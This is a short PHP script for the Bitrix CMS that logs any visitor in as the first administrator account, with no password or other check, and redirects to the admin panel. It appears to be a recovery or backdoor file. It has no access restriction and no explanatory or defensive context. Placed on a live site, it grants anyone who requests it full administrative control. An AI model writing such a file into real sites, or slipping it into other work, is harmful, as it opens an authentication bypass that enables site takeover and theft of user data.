<?php require($_SERVER["DOCUMENT_ROOT"]."/bitrix/modules/main/include/prolog_before.php"); 
$rs = $USER->GetList(($by="ID"), ($order="ASC"), array("GROUPS_ID" => array(1)));
if($arUser = $rs->Fetch())
   $USER->Authorize($arUser['ID']); 
LocalRedirect("/bitrix/admin/");
?>
